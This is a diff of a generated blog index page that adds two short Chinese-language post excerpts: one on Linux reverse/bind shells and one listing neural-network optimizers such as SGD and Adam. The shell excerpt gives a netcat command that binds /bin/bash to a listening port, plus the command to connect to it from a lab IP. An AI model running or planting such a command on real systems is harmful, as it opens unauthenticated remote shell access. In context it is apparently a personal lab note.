@@ -156,6 +156,167 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/Linux/%E5%8F%8D%E5%BC%B9shell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
+      <meta itemprop="name" content="Paul C">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paul C's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/categories/Linux/%E5%8F%8D%E5%BC%B9shell/" class="post-title-link" itemprop="url">反弹shell</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2019-03-11 19:59:30" itemprop="dateCreated datePublished" datetime="2019-03-11T19:59:30+08:00">2019-03-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-06-04 03:03:58" itemprop="dateModified" datetime="2022-06-04T03:03:58+08:00">2022-06-04</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Linux/" itemprop="url" rel="index"><span itemprop="name">Linux</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="正向"><a href="#正向" class="headerlink" title="正向"></a>正向</h2><p>先虚拟机再主机</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7777 -e /bin/bash</span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.93.135 7777</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/ML/Optimizer/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
+      <meta itemprop="name" content="Paul C">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paul C's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/categories/ML/Optimizer/" class="post-title-link" itemprop="url">Optimizer</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2019-03-11 15:05:45" itemprop="dateCreated datePublished" datetime="2019-03-11T15:05:45+08:00">2019-03-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-01-29 12:03:44" itemprop="dateModified" datetime="2023-01-29T12:03:44+08:00">2023-01-29</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ML/" itemprop="url" rel="index"><span itemprop="name">机器学习</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <ul>
+<li>SGD(stochastic gradient descent)  随机梯度下降</li>
+<li>SGD with momentum</li>
+<li>Adagrad</li>
+<li>RMSProp</li>
+<li>Adam</li>
+</ul>
+<h2 id="Notation"><a href="#Notation" class="headerlink" title="Notation"></a>Notation</h2><p>参数： θ<em>t，</em></p>
+<p>梯度： ∇ L(θ<em>t)，</em></p>
+<p>动量：m_{t+1}</p>
+<h2 id="Problem-Simplication"><a href="#Problem-Simplication" class="headerlink" title="Problem Simplication"></a>Problem Simplication</h2><p>Off-line Learning</p>
+<p>Generalization  ，即SGDM收敛性一般优于Adam，而Adam训练起来比较快。可以设置Learning rate range，即upbound和lower bound，设置好stepsize，动态一大一小地设置学习率。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/ML/PoisonAttack01/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -821,7 +982,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">166</span>
+          <span class="site-state-item-count">168</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
